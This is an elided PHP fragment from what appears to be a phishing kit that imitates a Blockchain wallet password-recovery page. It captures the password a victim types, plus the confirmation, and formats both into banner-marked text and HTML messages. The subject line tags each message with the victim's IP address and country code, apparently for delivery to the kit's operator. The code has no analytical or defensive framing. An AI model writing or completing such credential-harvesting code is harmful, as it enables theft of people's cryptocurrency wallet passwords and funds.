...
$_SESSION['recoverPassword']   = $_POST['recoverPassword'];
$_SESSION['confirmationPassword']   = $_POST['confirmationPassword'];
...
$data = "
+++++++++++🌐 CoDeX@BLOCK.CHAIN PASSWORD CONFIRM INFO 🌐+++++++++++
Password         = ".$_SESSION['recoverPassword']."
Confirm Password = ".$_SESSION['confirmationPassword']."
+++++++++++🌐 CoDeX@BLOCK.CHAIN PASSWORD CONFIRM INFO 🌐+++++++++++
...
$msg = "
+++++++++++🌐 CoDeX@BLOCK.CHAIN PASSWORD CONFIRM INFO 🌐+++++++++++<br>
Password         = ".$_SESSION['recoverPassword']." <br>
Confirm Password = ".$_SESSION['confirmationPassword']." <br>
+++++++++++🌐 CoDeX@BLOCK.CHAIN PASSWORD CONFIRM INFO 🌐+++++++++++
<br>
...
$sub="NEW BLOCKCHAIN PASSWORD CONFIRM INFO FROM [$ip] [$countrycode] ";
